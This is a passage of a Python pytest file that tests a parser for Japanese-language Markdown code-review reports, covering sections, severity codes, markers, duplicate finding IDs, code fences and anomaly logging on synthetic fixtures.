    resolved = findings["alpha-model/resolved/I-1"]
    assert (resolved.status, resolved.severity, resolved.marker, resolved.missing) == (
        FindingStatus.RESOLVED,
        Severity.INFO,
        Marker.NONE,
        (),
    )
    assert resolved.finding_key != findings["alpha-model/active/I-1"].finding_key
    pending = findings["beta-model/pending/I-3"]
    assert (pending.status, pending.severity, pending.detected_head, pending.missing) == (
        FindingStatus.PENDING,
        Severity.INFO,
        "999999999999",
        (),
    )


def test_review_records_v1_sections_are_kept_without_unparsed_blocks() -> None:
    batch = _load(FIXTURES / "pr-903-review-records-v1")
    assert [(f.finding_id, f.status.value, f.severity) for f in batch.findings] == [
        ("model/unverified/U-1", "unverified", Severity.UNKNOWN),
        ("model/decided/M-2", "decided", Severity.MEDIUM),
    ]
    assert batch.active_findings() == ()
    assert batch.unparsed == ()
    assert batch.anomalies == ()
    assert all(f.missing == () for f in batch.findings)
    candidate, decided = batch.findings
    assert "- 不足している根拠: 通常の利用経路での再現。" in candidate.body
    assert candidate.detected_head == "aaaaaaaaaaaa"
    assert "- 判断: `Grok-4.7#M-2@25e76f6c513f`" in decided.body
    assert decided.detected_head == "25e76f6c513f"


@pytest.mark.parametrize(
    ("section", "code", "severity"),
    [("Unverified candidates", "H-1", Severity.UNKNOWN), ("Decided findings", "M-2", Severity.MEDIUM)],
)
def test_recorded_sections_do_not_require_active_evidence_fields(
    tmp_path: Path, section: str, code: str, severity: Severity
) -> None:
    text = f"{HEADER_LINE}\n\n## {section}\n\n### {code}: 記録\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert len(batch.findings) == 1
    assert batch.findings[0].severity is severity
    assert batch.findings[0].missing == ("位置", "検出時 HEAD")
    assert batch.unparsed == ()


@pytest.mark.parametrize("section", ["Unverified candidates", "Decided findings"])
@pytest.mark.parametrize(
    "preamble",
    [
        "なし",
        "なし（候補はすべて検証済み）",
        "なし。今回の候補はすべて検証して指摘にしたか、反証した。",
        "- なし",
        "なし。\n候補はすべて検証済み。",
        "該当なし（`skip` の判断が無い）",
    ],
)
def test_recorded_sections_ignore_preambles_and_preserve_following_records(
    tmp_path: Path, section: str, preamble: str
) -> None:
    prefix = f"{HEADER_LINE}\n\n## {section}\n\n{preamble}\n\n"
    directory = _review_dir(tmp_path, {"m.md": prefix})
    empty = _load(directory)
    assert empty.findings == ()
    assert empty.unparsed == ()
    code = "U-1" if section == "Unverified candidates" else "M-2"
    body = f"### {code}: 記録\n\n- 位置: `a.py:1`\n- 検出時 HEAD: `aaaaaaaaaaaa`\n- 固有の欄: 複数行\n  の本文。"
    (directory / "m.md").write_text(prefix + body + "\n", encoding="utf-8")
    batch = _load(directory)
    assert batch.unparsed == ()
    assert len(batch.findings) == 1
    record = batch.findings[0]
    assert record.body == body
    assert (record.location, record.detected_head, record.missing) == ("`a.py:1`", "aaaaaaaaaaaa", ())
    assert record.status.value == ("unverified" if section == "Unverified candidates" else "decided")


@pytest.mark.parametrize("section", ["Low", "Resolved findings", "Pending previous findings"])
def test_existing_finding_sections_still_flag_text_without_headings(tmp_path: Path, section: str) -> None:
    text = f"{HEADER_LINE}\n\n## {section}\n\n見出しのない指摘の本文。\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert batch.findings == ()
    assert [block.reason for block in batch.unparsed] == ["text outside a finding heading"]


@pytest.mark.parametrize("section", ["Unverified candidates", "Decided findings"])
def test_recorded_sections_keep_malformed_headings_unparsed(tmp_path: Path, section: str) -> None:
    text = f"{HEADER_LINE}\n\n## {section}\n\n### U-1:\n\n### bad heading\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert batch.findings == ()
    assert [block.reason for block in batch.unparsed] == [
        "finding heading without title",
        "unrecognized finding heading",
    ]


@pytest.mark.parametrize("prefix", ["", "## Unknown\n", "## Unverified candidates extra\n", "# Decided findings\n"])
def test_recorded_heading_outside_exact_known_sections_stays_unparsed(tmp_path: Path, prefix: str) -> None:
    text = f"{HEADER_LINE}\n\n{prefix}\n### U-1: 候補\n\n### M-2: 判断済み\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert batch.findings == ()
    assert [block.reason for block in batch.unparsed] == ["finding heading outside a finding section"] * 2


def test_severity_comes_from_the_section_or_the_code_letter(tmp_path: Path) -> None:
    text = "\n".join(
        [
            HEADER_LINE,
            "",
            "## Critical",
            "",
            "### C-1: 重大な指摘",
            "",
            "## High",
            "",
            "### H-1: 高い指摘",
            "",
            "## Resolved findings",
            "",
            "### H-2: 解消した高い指摘",
            "",
            "### CR-1: 英字 2 文字の code",
            "",
            "## Pending previous findings",
            "",
            "### M-3: 持ち越した指摘",
            "",
            "- 内容: 合成データ。",
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert [(finding.finding_id, finding.status, finding.severity, finding.missing) for finding in batch.findings] == [
        ("m/active/C-1", FindingStatus.ACTIVE, Severity.CRITICAL, ACTIVE_FIELDS),
        ("m/active/H-1", FindingStatus.ACTIVE, Severity.HIGH, ACTIVE_FIELDS),
        ("m/resolved/H-2", FindingStatus.RESOLVED, Severity.HIGH, RESOLVED_FIELDS),
        ("m/resolved/CR-1", FindingStatus.RESOLVED, Severity.UNKNOWN, RESOLVED_FIELDS),
        ("m/pending/M-3", FindingStatus.PENDING, Severity.MEDIUM, ("位置", "検出時 HEAD", "根拠", "推奨対応")),
    ]
    assert batch.anomalies == ()


def test_finding_fields_lines_and_body() -> None:
    batch = _load(SYNTHETIC)
    alpha_path = SYNTHETIC / "alpha-model.md"
    finding = _by_id(batch)["alpha-model/active/L-1"]
    assert finding.line_start == _line_no_by_prefix(alpha_path, "### L-1:")
    assert finding.line_end == _line_no_by_prefix(alpha_path, "```", occurrence=2)
    lines = alpha_path.read_text(encoding="utf-8").split("\n")
    assert finding.body == "\n".join(lines[finding.line_start - 1 : finding.line_end])
    assert "### L-9: フェンス内の見出しは指摘ではない" in finding.body
    assert (finding.severity, finding.status, finding.code, finding.marker) == (
        Severity.LOW,
        FindingStatus.ACTIVE,
        "L-1",
        Marker.VERIFIED,
    )
    assert finding.title == "`widget.py` の境界値で 0 除算になる"
    assert finding.location == "`src/widget.py:10-12`"
    assert finding.content == (
        "`ratio()` は `count` が 0 のとき `total / count` を計算する。\n呼び出し元は空の一覧でも `ratio()` を呼ぶ。"
    )
    assert finding.evidence == "`src/widget.py:11` を読み、空の一覧で `ZeroDivisionError` になることを確認した。"
    # フェンス内の行は箇条の継続行なので、直後のフェンスまでが推奨対応の値になる
    assert finding.recommendation == (
        "`count == 0` のとき 0 を返す分岐を足し、テストで固定する。\n"
        "\n"
        "```md\n"
        "## Low\n"
        "### L-9: フェンス内の見出しは指摘ではない\n"
        "```"
    )
    assert (finding.reviewed_head, finding.detected_head, finding.missing) == ("aaaaaaaaaaaa", "999999999999", ())
    assert (finding.repository, finding.review_dir, finding.source_file, finding.model_name) == (
        Repository.ENV,
        "pr-901-synthetic",
        "alpha-model.md",
        "alpha-model",
    )
    assert finding.finding_key == finding_key(Repository.ENV, "pr-901-synthetic", "alpha-model/active/L-1")


def test_markers_missing_fields_and_recorded_anomalies() -> None:
    batch = _load(SYNTHETIC)
    findings = _by_id(batch)
    beta_path = SYNTHETIC / "beta-model.md"
    assert findings["alpha-model/active/I-1"].marker is Marker.NONE
    assert findings["alpha-model/active/I-1"].missing == ("推奨対応",)
    assert findings["alpha-model/active/I-2"].marker is Marker.CONFIRM_RECOMMENDED
    medium = findings["beta-model/active/M-1"]
    assert (medium.marker, medium.severity, medium.location, medium.missing) == (
        Marker.DESIGN_JUDGMENT,
        Severity.MEDIUM,
        None,
        ("位置",),
    )
    assert medium.reviewed_head == "bbbbbbbbbbbb"
    assert findings["beta-model/active/L-1"].detected_head is None
    second = findings["beta-model/active/L-1~2"]
    assert (second.code, second.marker, second.location) == ("L-1", Marker.NONE, "`src/tmp.py:20`")
    assert second.title == "同じ番号を 2 回使った指摘【検証済み・既出】"
    assert findings["beta-model/active/M-2"].severity is Severity.LOW
    first_line = _line_no_by_prefix(beta_path, "### L-1:")
    second_line = _line_no_by_prefix(beta_path, "### L-1:", occurrence=2)
    duplicate_line = _line_no_by_prefix(beta_path, "- 位置: `src/tmp.py:21`")
    assert batch.anomalies == (
        f"beta-model.md: header head bbbbbbbbbbbb differs from reviewed_head {REVIEWED_HEAD}",
        f"beta-model.md:{_line_no_by_prefix(beta_path, '| 2026-09-18T09:00:00Z')}: unrecognized review history row",
        f"beta-model.md:{first_line}: unrecognized 検出時 HEAD value",
        f"beta-model.md:{second_line}: unknown marker 【...】",
        f"beta-model.md:{duplicate_line}: duplicate field 位置; first value kept",
        f"beta-model.md:{second_line}: duplicate finding id beta-model/active/L-1; renamed to beta-model/active/L-1~2",
        f"beta-model.md:{_line_no_by_prefix(beta_path, '### M-2:')}: code M-2 does not match section Low",
    )


def test_marker_is_split_at_the_first_opening_after_the_last_inner_closing(tmp_path: Path) -> None:
    # 末尾の 】 と、その手前にある最後の 】 より後で最初の 【 との間をマーカとする。
    # 閉じない 【 を大量に並べた見出しも同じ規則で title・marker・anomaly を決める（時間は assert しない）
    many = 20_000
    # (見出しの題名部分, title, marker, 未知のマーカとして anomaly を記録するか)。未知のマーカは title に残す
    cases: list[tuple[str, str, Marker, bool]] = [
        ("a【b【c】", "a【b【c】", Marker.NONE, True),
        ("a】【b】", "a】【b】", Marker.NONE, True),
        ("a】【検証済み】", "a】", Marker.VERIFIED, False),
        ("a【b】【要設計判断】", "a【b】", Marker.DESIGN_JUDGMENT, False),
        ("a【検証済み】【確認推奨】", "a【検証済み】", Marker.CONFIRM_RECOMMENDED, False),
        ("a【【検証済み】", "a【【検証済み】", Marker.NONE, True),
        ("a【検証済み】 b", "a【検証済み】 b", Marker.NONE, False),
        ("a 【確認推奨】", "a", Marker.CONFIRM_RECOMMENDED, False),
        ("【】", "【】", Marker.NONE, True),
        ("【" * many, "【" * many, Marker.NONE, False),
        ("【" * many + "】", "【" * many + "】", Marker.NONE, True),
        ("【" * many + "】【検証済み】", "【" * many + "】", Marker.VERIFIED, False),
    ]
    headings = [f"### L-{number}: {rest}" for number, (rest, _, _, _) in enumerate(cases, start=1)]
    text = "\n\n".join([HEADER_LINE, "## Low", *headings]) + "\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert [(finding.title, finding.marker) for finding in batch.findings] == [
        (title, marker) for _, title, marker, _ in cases
    ]
    # anomaly にはマーカの原文を写さず、固定の文言だけを記録する
    assert batch.anomalies == tuple(
        f"m.md:{_line_no_exact(text, heading)}: unknown marker 【...】"
        for heading, (_, _, _, unknown) in zip(headings, cases, strict=True)
        if unknown
    )
    assert batch.unparsed == ()


def test_duplicate_field_anomaly_only_for_fields_whose_values_are_used(tmp_path: Path) -> None:
    text = "\n".join(
        [
            MINIMAL.removesuffix("\n"),
            "- 備考: 一つ目。",
            "- 備考: 二つ目。",
            "- 内容: 二つ目の内容。",
            "",
            "## Resolved findings",
            "",
            "### L-2: 解消した指摘",
            "",
            "- 検出時 HEAD: `aaaaaaaaaaaa`",
            "- 解消確認時 HEAD: `aaaaaaaaaaaa`",
            "- 確認根拠: 一つ目。",
            "- 確認根拠: 二つ目。",
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    active, resolved = batch.findings
    assert active.content == "合成データ。"
    assert "- 備考: 二つ目。" in active.body
    assert (active.missing, resolved.missing) == ((), ())
    assert batch.anomalies == (
        f"m.md:{_line_no_exact(text, '- 内容: 二つ目の内容。')}: duplicate field 内容; first value kept",
        f"m.md:{_line_no_exact(text, '- 確認根拠: 二つ目。')}: duplicate field 確認根拠; first value kept",
    )


def test_third_finding_with_the_same_code_is_renamed_with_suffix_3(tmp_path: Path) -> None:
    text = MINIMAL + "\n### L-1: 二つ目\n\n### L-1: 三つ目\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert [finding.finding_id for finding in batch.findings] == ["m/active/L-1", "m/active/L-1~2", "m/active/L-1~3"]
    assert [finding.title for finding in batch.findings] == ["最小の指摘", "二つ目", "三つ目"]
    second, third = _line_no_exact(text, "### L-1: 二つ目"), _line_no_exact(text, "### L-1: 三つ目")
    assert batch.anomalies == (
        f"m.md:{second}: duplicate finding id m/active/L-1; renamed to m/active/L-1~2",
        f"m.md:{third}: duplicate finding id m/active/L-1; renamed to m/active/L-1~3",
    )


def test_many_findings_with_the_same_code_are_renamed_in_order(tmp_path: Path) -> None:
    count = 2000
    heading = "### L-1: x"
    text = "\n\n".join([HEADER_LINE, "## Low", *([heading] * count)]) + "\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    ids = ["m/active/L-1", *(f"m/active/L-1~{number}" for number in range(2, count + 1))]
    assert [finding.finding_id for finding in batch.findings] == ids
    heading_lines = [number for number, line in enumerate(text.split("\n"), start=1) if line == heading]
    assert [finding.line_start for finding in batch.findings] == heading_lines
    assert batch.anomalies == tuple(
        f"m.md:{line}: duplicate finding id m/active/L-1; renamed to {renamed}"
        for line, renamed in zip(heading_lines[1:], ids[1:], strict=True)
    )


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("a" * 41, None),
        ("aaaaaaaZ", None),
        ("`bbbbbbb` の時点", "bbbbbbb"),
    ],
)
def test_detected_head_value_boundaries(tmp_path: Path, value: str, expected: str | None) -> None:
    text = MINIMAL.replace("- 検出時 HEAD: `aaaaaaaaaaaa`", f"- 検出時 HEAD: {value}")
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    [finding] = batch.findings
    assert finding.detected_head == expected
    anomaly = f"m.md:{_line_no_exact(text, '### L-1: 最小の指摘')}: unrecognized 検出時 HEAD value"
    assert batch.anomalies == ((anomaly,) if expected is None else ())


def test_names_and_section_titles_are_read_literally(tmp_path: Path) -> None:
    text = "\n".join(
        [
            HEADER_LINE,
            "",
            "# Review history",
            "",
            "| Reviewed at (UTC) | HEAD | Mode |",
            "| --- | --- | --- |",
            "| 2026-09-20T00:00:00Z | `aaaaaaaaaaaa` | Initial |",
            "| broken row |",
            "",
            "## Low  ",
            "",
            "### L-1: 箇条名の後ろに空白がある指摘",
            "",
            "- 位置 : `a.py:1`",
            "- 検出時 HEAD: `aaaaaaaaaaaa`",
            "- 内容: 合成データ。",
            "- 根拠: 合成データ。",
            "- 推奨対応: なし。",
            "",
            "##  Low",
            "",
            "### L-2: 節名の前に空白が 2 つある",
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    # (c) `# Review history` は履歴の節ではない
    assert batch.files[0].history == ()
    # (a) 箇条名は空白を除かずに照合する
    [finding] = batch.findings
    assert (finding.finding_id, finding.location, finding.missing) == ("m/active/L-1", None, ("位置",))
    # (b) `## ` の後ろは末尾の空白だけ除く
    heading = _line_no_exact(text, "### L-2: 節名の前に空白が 2 つある")
    assert [(block.line_start, block.line_end, block.reason) for block in batch.unparsed] == [
        (heading, heading, "finding heading outside a finding section")
    ]
    assert batch.anomalies == ()


def test_top_level_heading_ends_the_section_and_the_finding_block(tmp_path: Path) -> None:
    paragraph = "本文 I-9 を含む段落"
    text = MINIMAL + "\n".join(
        [
            "",
            "# 付録",
            "",
            "付録の本文。",
            "",
            "### L-2: 付録の見出し",
            "",
            "## Info",
            paragraph,
            "### I-1(a): x",
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    [finding] = batch.findings
    # `# ` は節の境界であり、指摘のブロックの終わりでもある
    assert finding.line_end == _line_no_exact(text, "- 推奨対応: なし。")
    assert "# 付録" not in finding.body
    l2, block, i1a = (_line_no_exact(text, line) for line in ("### L-2: 付録の見出し", paragraph, "### I-1(a): x"))
    # 見出しの前の段落は、その後の見出しのブロックより前に並ぶ（ファイル内の出現順）
    assert _unparsed_spans(batch) == [
        (l2, l2, "finding heading outside a finding section"),
        (block, block, "text outside a finding heading"),
        (i1a, i1a, "unrecognized finding heading"),
    ]
    assert batch.anomalies == ()


def test_other_headings_outside_finding_sections_are_skipped(tmp_path: Path) -> None:
    text = MINIMAL.replace("## Low\n", "## Summary\n\n### Low\n\n- L-1: 概要の一覧\n\n## Low\n")
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert [finding.finding_id for finding in batch.findings] == ["m/active/L-1"]
    assert (batch.unparsed, batch.anomalies) == ((), ())


def test_heading_with_only_a_marker_has_no_title(tmp_path: Path) -> None:
    text = MINIMAL.replace("### L-1: 最小の指摘", "### L-1: 【検証済み】")
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    heading = _line_no_exact(text, "### L-1: 【検証済み】")
    assert batch.findings == ()
    assert _unparsed_spans(batch) == [
        (heading, _line_no_exact(text, "- 推奨対応: なし。"), "finding heading without title")
    ]
    assert batch.anomalies == ()


def test_bullet_rules(tmp_path: Path) -> None:
    text = "\n".join(
        [
            HEADER_LINE,
            "",
            "## Low",
            "",
            "### L-1: 箇条の規則",
            "",
            "- 位置：`full-width.py:1`",
            "- 内容:   前後に空白がある値  ",
            "\tタブで字下げした継続行",
            "",
            "- 根拠:",
            "- 推奨対応:    ",
            "- 検出時 HEAD: abcdef0 の時点",
            "",
            "### L-2: 空白のない箇条",
            "",
            "-位置: `nospace.py:1`",
            "- 検出時 HEAD: `aaaaaaaaaaaa`",
            "- 内容: 合成データ。",
            "- 根拠: 合成データ。",
            "- 推奨対応: なし。",
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    first, second = batch.findings
    # 全角コロンも区切りとして読み、値の前後の空白を除き、タブで始まる行も継続行にする
    assert first.location == "`full-width.py:1`"
    assert first.content == "前後に空白がある値  \n\tタブで字下げした継続行"
    # 値が空（空白だけを含む）の箇条はフィールドにせず missing に入れる
    assert (first.evidence, first.recommendation, first.missing) == (None, None, ("根拠", "推奨対応"))
    # 検出時 HEAD はバッククォートがなくても読む
    assert first.detected_head == "abcdef0"
    # `-` の後に空白がない行は箇条ではない
    assert (second.location, second.missing) == (None, ("位置",))
    assert batch.anomalies == ()


def test_no_findings_statements_are_neither_findings_nor_unparsed() -> None:
    batch = _load(SYNTHETIC)
    assert {finding.source_file for finding in batch.findings} == {"alpha-model.md", "beta-model.md"}
    gamma = next(review_file for review_file in batch.files if review_file.source_file == "gamma-model.md")
    assert [row.head for row in gamma.history] == ["aaaaaaaaaaaa"]
    assert batch.unparsed == ()


@pytest.mark.parametrize(
    ("statement", "skipped"),
    [
        ("（" + "あ" * 36 + "省略）", True),
        ("（" + "あ" * 37 + "省略）", False),
        ("省略", True),
        ("N/A", True),
        ("None", True),
        # 実データとフィクスチャにある「指摘なし」の記述は読み飛ばし続ける
        ("なし", True),
        ("（該当なし）", True),
        ("（なし）", True),
        ("（指摘なし）", True),
        ("（初回レビューのため省略）", True),
        ("該当なし（初回レビューのため）。", True),
        ("指摘なし。", True),
        ("UTF-8 なし", False),
        ("なし\n（前回と同じ）", False),
        # 箇条は既定語を含んでも指摘の可能性があるので読み飛ばさない
        ("- 引数なしで `run()` を呼ぶと KeyError", False),
        ("* `--force` 指定時に確認を省略する", False),
        ("+ `load()` が None を返す", False),
        ("1. 確認を省略する", False),
        # 行全体が定型に一致しない散文は、既定語を含んでいても、既定語で始まっていても読み飛ばさない
        ("`load()` を引数なしで呼ぶと TypeError になる", False),
        ("`--dest` 省略時に KeyError で停止する", False),
        ("`save()` に排他制御がありません", False),
        ("Nonetheless, `close()` leaks the fd", False),
        ("省略時に `--dest` が KeyError になる", False),
        ("None of the handlers close the fd", False),
        ("なしで呼ぶと KeyError", False),
        # コード片を含む括弧書きは指摘の可能性がある
        ("（`--dest` の検証なし）", False),
        # 箇条以外の構造を持つ行も定型ではない
        ("#### なし", False),
        ("> なし", False),
        ("| なし |", False),
        ("<!-- なし -->", False),
    ],
)
def test_no_findings_statement_boundaries(tmp_path: Path, statement: str, skipped: bool) -> None:
    text = f"{HEADER_LINE}\n\n## Info\n\n{statement}\n\n### I-1: 後続の指摘\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    first = _line_no_exact(text, statement.split("\n")[0])
    last = first + statement.count("\n")
    expected = [] if skipped else [(first, last, "text outside a finding heading")]
    assert [(block.line_start, block.line_end, block.reason) for block in batch.unparsed] == expected
    assert [finding.finding_id for finding in batch.findings] == ["m/active/I-1"]
    assert batch.anomalies == ()


@pytest.mark.parametrize(
    ("after", "later"),
    [("", None), ("## Summary\n\n本文。\n", None), ("## Info\n別の節の本文。\n", "別の節の本文。")],
    ids=["end-of-file", "next-section", "next-finding-section"],
)
def test_text_without_a_heading_in_a_finding_section_is_unparsed(
    tmp_path: Path, after: str, later: str | None
) -> None:
    # 段落の直後がファイル末尾の場合と、空行を挟まずに次の ## 節が始まる場合のどちらも unparsed に残す。
    # 次の節が指摘の節なら、その節の段落は別のブロックになる（節の境界で段落を区切る）
    paragraph = ["- 位置: `a.py:1`", "- 内容: 見出しのない指摘。"]
    text = "\n".join([HEADER_LINE, "", "## Low", "", *paragraph]) + "\n" + after
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    first = _line_no_exact(text, paragraph[0])
    expected = [(first, first + 1, "text outside a finding heading")]
    if later is not None:
        expected.append((_line_no_exact(text, later), _line_no_exact(text, later), "text outside a finding heading"))
    assert _unparsed_spans(batch) == expected
    assert (batch.findings, batch.anomalies) == ((), ())


def test_keeps_unrecognised_blocks_as_unparsed() -> None:
    batch = _load(ODD)
    path = ODD / "delta-model.md"
    lines = path.read_text(encoding="utf-8").split("\n")
    info_first = _line_no_by_prefix(path, "実行可能な新規指摘")
    bullet = _line_no_by_prefix(path, "- `widget.py`")
    carried = _line_no_by_prefix(path, "なし（前回 active")
    assert [(block.line_start, block.line_end, block.reason) for block in batch.unparsed] == [
        (
            _line_no_by_prefix(path, "### L-5:"),
            _line_no_by_prefix(path, "- 内容: 指摘の節の外にある。"),
            "finding heading outside a finding section",
        ),
        (
            _line_no_by_prefix(path, "### L-2:"),
            _line_no_by_prefix(path, "- 内容: 題名のない見出し。"),
            "finding heading without title",
        ),
        (
            _line_no_by_prefix(path, "### L-3 "),
            _line_no_by_prefix(path, "- 内容: 形式外の見出し。"),
            "unrecognized finding heading",
        ),
        (info_first, info_first, "text outside a finding heading"),
        (bullet, bullet, "text outside a finding heading"),
        (carried, carried, "text outside a finding heading"),
        (
            _line_no_by_prefix(path, "```text"),
            _line_no_by_prefix(path, "未閉じのフェンス"),
            "text outside a finding heading",
        ),
        (
            _line_no_by_prefix(path, "### L-1(a):"),
            _line_no_by_prefix(path, "- 確認根拠: 形式外。"),
            "unrecognized finding heading",
        ),
        (
            _line_no_by_prefix(path, "### PR #7 M-1:"),
            _line_no_by_prefix(path, "- 確認根拠: 形式外。", occurrence=2),
            "unrecognized finding heading",
        ),
    ]
    for block in batch.unparsed:
        text = "\n".join(lines[block.line_start - 1 : block.line_end])
        assert block.text_sha256 == hashlib.sha256(text.encode("utf-8")).hexdigest()
        assert block.source_file == "delta-model.md"
    assert [finding.finding_id for finding in batch.findings] == ["delta-model/active/I-4"]
    late = batch.findings[0]
    assert (late.reviewed_head, late.detected_head, late.location) == (None, "cccccccccccc", "`src/late.py:2`")
    assert batch.anomalies == (
        "delta-model.md:1: unrecognized header line",
        f"delta-model.md:{_line_no_by_prefix(path, '```text')}: unclosed code fence ignored",
        "notes.txt: ignored non-markdown entry",
    )


def test_headings_inside_fences_are_not_structure(tmp_path: Path) -> None:
    text = MINIMAL + "\n~~~markdown\n## Critical\n### C-1: フェンス内\n~~~\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert [finding.finding_id for finding in batch.findings] == ["m/active/L-1"]
    assert "### C-1: フェンス内" in batch.findings[0].body
    assert batch.findings[0].recommendation == "なし。\n\n~~~markdown\n## Critical\n### C-1: フェンス内\n~~~"
    assert batch.unparsed == ()


def test_indented_fences_inside_a_bullet_hide_headings(tmp_path: Path) -> None:
    hidden = ["## Critical", "### C-1: x"]
    text = "\n".join(
        [
            HEADER_LINE,
            "",
            "## Low",
            "",
            "### L-1: 字下げしたフェンスを含む指摘",
            "",
            "- 位置: `a.py:1`",
            "- 内容: 次の抜粋を参照する。",
            "",
            "  ```md",
            *hidden,
            "  ```",
            "",
            "    ~~~",
            *hidden,
            "    ~~~",
            "",
            "\t```",
            *hidden,
            "\t```",
            "- 根拠: 合成データ。",
            "- 推奨対応: なし。",
            "- 検出時 HEAD: `aaaaaaaaaaaa`",
            "",
        ]
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    [finding] = batch.findings
    assert finding.finding_id == "m/active/L-1"
    assert (batch.unparsed, batch.anomalies) == ((), ())
    assert finding.content == "\n".join(
        [
            "次の抜粋を参照する。",
            "",
            "```md",
            *hidden,
            "```",
            "",
            "  ~~~",
            *hidden,
            "  ~~~",
            "",
            "\t```",
            *hidden,
            "\t```",
        ]
    )
    assert (finding.evidence, finding.recommendation, finding.detected_head, finding.missing) == (
        "合成データ。",
        "なし。",
        "aaaaaaaaaaaa",
        (),
    )


def test_many_unclosed_fences_are_each_recorded(tmp_path: Path) -> None:
    # 長い開始の後に短い開始が来る場合と、閉じないと分かった長さ以上の開始が来る場合の両方を通す。
    # 閉じない ` の開始は最短でも 4 個なので、後ろの 3 個の ``` フェンスは閉じたフェンスとして扱われる
    openers = ["`````text", "~~~~~text", "````text", "~~~~text", "~~~text"] * 400
    text = (
        MINIMAL.replace("## Low\n", "## Summary\n\n" + "\n".join(openers) + "\n\n## Low\n")
        + "\n```md\n## Critical\n```\n"
    )
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    opener_set = set(openers)
    opener_lines = [number for number, line in enumerate(text.split("\n"), start=1) if line in opener_set]
    assert len(opener_lines) == 2000
    assert batch.anomalies == tuple(f"m.md:{number}: unclosed code fence ignored" for number in opener_lines)
    assert [finding.finding_id for finding in batch.findings] == ["m/active/L-1"]
    assert (batch.findings[0].recommendation, batch.findings[0].missing) == ("なし。\n\n```md\n## Critical\n```", ())
    assert batch.unparsed == ()


def test_unclosed_fences_of_decreasing_length_are_each_recorded(tmp_path: Path) -> None:
    # 長さが単調に減る閉じない開始行。各開始の後に本文の行を挟む（時間は assert しない）
    fence_lines = [line for length in range(1200, 2, -1) for line in ("`" * length + "text", "本文")]
    text = MINIMAL.replace("## Low\n", "## Summary\n\n" + "\n".join(fence_lines) + "\n\n## Low\n")
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    opener_lines = [number for number, line in enumerate(text.split("\n"), start=1) if line.startswith("```")]
    assert len(opener_lines) == 1198
    assert batch.anomalies == tuple(f"m.md:{number}: unclosed code fence ignored" for number in opener_lines)
    assert [finding.finding_id for finding in batch.findings] == ["m/active/L-1"]
    assert batch.findings[0].missing == ()
    assert batch.unparsed == ()


def test_column_zero_fences_outside_finding_blocks_hide_structure(tmp_path: Path) -> None:
    hidden = "```md\n## Critical\n### C-1: x\n```\n"
    # 最初の節の前と ## Summary の中にある、字下げのないフェンス
    text = MINIMAL.replace("\n## Low\n", "\n" + hidden + "\n## Summary\n\n" + hidden + "\n## Low\n")
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert [finding.finding_id for finding in batch.findings] == ["m/active/L-1"]
    assert (batch.unparsed, batch.anomalies) == ((), ())


def test_fenced_bullet_is_not_a_field(tmp_path: Path) -> None:
    fenced = "```text\n- 位置: `fake.py:1`\n```\n\n"
    text = MINIMAL.replace("### L-1: 最小の指摘\n\n", "### L-1: 最小の指摘\n\n" + fenced)
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    [finding] = batch.findings
    assert (finding.location, finding.missing) == ("`a.py:1`", ())
    assert batch.anomalies == ()


@pytest.mark.parametrize(
    ("summary", "expected_ids"),
    [
        # バッククォート 2 個はフェンスを開かない
        ("``md\n## Critical\n\n### C-1: 見出しとして読む\n``", ["m/active/C-1", "m/active/H-1"]),
        # 開始より長い終了行でも閉じる
        ("```md\n## Critical\n### C-1: フェンス内\n`````", ["m/active/H-1"]),
        # フェンス文字以外を含む行は終了行ではない
        ("```md\n``` x\n## Critical\n### C-1: フェンス内\n```", ["m/active/H-1"]),
        # 異なる文字の行は終了行ではない
        ("~~~md\n```\n## Critical\n### C-1: フェンス内\n~~~", ["m/active/H-1"]),
        # ~ のフェンスは info 文字列にバッククォートを含んでも開く
        ("~~~ `md`\n## Critical\n### C-1: フェンス内\n~~~", ["m/active/H-1"]),
    ],
    ids=["two-backticks", "longer-closer", "closer-with-text", "other-character", "tilde-info-with-backtick"],
)
def test_fence_boundaries(tmp_path: Path, summary: str, expected_ids: list[str]) -> None:
    text = f"{HEADER_LINE}\n\n## Summary\n\n{summary}\n\n## High\n\n### H-1: フェンスの後の指摘\n"
    batch = _load(_review_dir(tmp_path, {"m.md": text}))
    assert [finding.finding_id for finding in batch.findings] == expected_ids
    assert (batch.unparsed, batch.anomalies) == ((), ())


_INLINE_CODE_LINE = "```x``` で始まる段落。"
_AFTER_FIRST_FINDING = "### L-2: 二つ目\n\n```text\nfenced\n```\n\n### L-3: 三つ目\n"


@pytest.mark.parametrize(
    ("summary", "low", "inline_is_unparsed"),
    [
        # 指摘の本文にある。後ろの本物のフェンスの終了行で閉じるとみなすと、L-2 が L-1 の本文に吸収される
        ("要約。", f"### L-1: 一つ目\n\n{_INLINE_CODE_LINE}\n\n{_AFTER_FIRST_FINDING}", False),
        # 節の見出しより前にある。閉じるとみなすと、## Low と L-1・L-2 の見出しが隠れる
        (_INLINE_CODE_LINE, f"### L-1: 一つ目\n\n{_AFTER_FIRST_FINDING}", False),
        # 指摘の節で最初の見出しより前にある。行自体は従来どおり unparsed に残る
        ("要約。", f"{_INLINE_CODE_LINE}\n\n### L-1: 一つ目\n\n{_AFTER_FIRST_FINDING}", True),
